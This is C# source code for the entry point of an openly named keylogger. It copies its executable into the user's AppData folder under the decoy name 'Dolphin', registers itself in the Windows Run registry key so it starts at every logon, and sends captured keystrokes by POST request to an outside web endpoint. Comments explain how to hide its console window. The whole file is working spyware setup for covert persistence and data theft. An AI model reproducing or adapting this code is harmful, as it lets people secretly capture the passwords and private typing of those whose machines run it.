using System;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.Win32;

namespace Keylogger
{
    class Program
    {
        static ManualResetEvent waitHandle = new ManualResetEvent(false);
        static void Main(string[] args)
        {
            //-------------------------------------------------------//

            bool enableConsoleOutput = true;
            //If you want console to become invisible, go to project ->
            //properties -> application and set output type to windows application

            string URL = @"https://ptsv2.com/t/l0l8k-1585687144/post";
            //You can set link of rest api service, that accepts post requsts.
            //By default, it's free debug service for accepting post request.
            //Results can be vieved here: https://ptsv2.com/t/l0l8k-1585687144

            bool hideExecutable = true;
            string appTitle = "Dolphin";
            string path = String.Format(@"C:\Users\{0}\AppData\Roaming\", 
                                        Environment.UserName);
            //During the first launch, program can hide itself to a
            //specified path

            bool placeToStartup = true;
            //During the first launch, program can place itself to a
            //startup register

            //-------------------------------------------------------//

            bool replaced = false;
            if(hideExecutable && path != Application.ExecutablePath)
            {
                try
                {
                    if(!File.Exists(path + appTitle + ".exe"))
                    {
                        File.Move(Application.ExecutablePath, path + appTitle + ".exe");
                    }
                    replaced = true;
                    
                }
                catch { }
            }
            if(placeToStartup)
            {
                string pathToPlace = "";
                if(!hideExecutable)
                {
                    pathToPlace = Application.ExecutablePath;
                }
                else if(replaced)
                {
                    pathToPlace = path + appTitle + ".exe";
                }
                if(pathToPlace != "")
                {
                    RegistryKey key = Registry.CurrentUser.OpenSubKey
                        (@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);
                    if(!pathToPlace.Equals(key.GetValue(appTitle)))
                    {
                        key.SetValue(appTitle, pathToPlace);
                    }
                }
            }

            Catcher catcher = new Catcher(20);
            Logger logger = new Logger(URL, enableConsoleOutput);
            catcher.KeyDown += logger.KeyDown;
            catcher.KeyUp += logger.KeyUp;
            catcher.Start();           
            waitHandle.WaitOne();
        }
    }
}
